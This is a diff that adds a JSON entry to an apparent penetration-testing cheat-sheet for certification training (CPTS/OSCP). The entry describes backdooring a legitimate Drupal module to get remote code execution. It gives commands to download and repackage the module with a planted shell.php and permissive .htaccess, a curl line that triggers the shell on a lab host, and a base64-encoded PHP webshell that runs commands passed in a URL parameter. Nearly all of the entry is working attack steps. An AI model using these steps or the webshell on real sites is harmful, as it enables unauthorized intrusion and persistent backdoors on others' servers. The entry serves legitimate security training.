@@ -1,0 +1,80 @@
+{
+  "type": "script",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "drupal"
+  ],
+  "tags": [
+    "drupal",
+    "webshell",
+    "module"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Drupal",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Download a real module to backdoor",
+      "command": "wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz"
+    },
+    {
+      "label": "Extract it",
+      "command": "tar xvf captcha-8.x-1.2.tar.gz"
+    },
+    {
+      "label": "Trigger the planted shell after installing the module",
+      "command": "curl -s drupal.inlanefreight.local/modules/captcha/shell.php?<rand>=id"
+    }
+  ],
+  "notes": "Backdooring a legit module (adding shell.php + a permissive .htaccess) is the go-to when the PHP filter is unavailable. The .htaccess is required so Apache will execute PHP under /modules.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "drupal-detect",
+      "note": "Scopes the Drupal version/module workflow.",
+      "rel": "prereq"
+    },
+    {
+      "id": "drupal-php-filter-webshell",
+      "note": "Simpler path on older Drupal with the PHP filter.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "drupal-backdoor-module",
+  "name": "Drupal - Backdoored Module Upload",
+  "command": "# add shell.php + .htaccess to a module, repackage, install\nmv shell.php .htaccess captcha\ntar cvf captcha.tar.gz captcha/",
+  "description": "Downloads a legitimate module, injects a PHP webshell plus a .htaccess to allow execution, repackages it, and installs it via Extend > Install new module for RCE.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "variations": [
+    {
+      "label": "Create webshell via base64 decode (alternative to embedding in module)",
+      "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php"
+    }
+  ]
+}
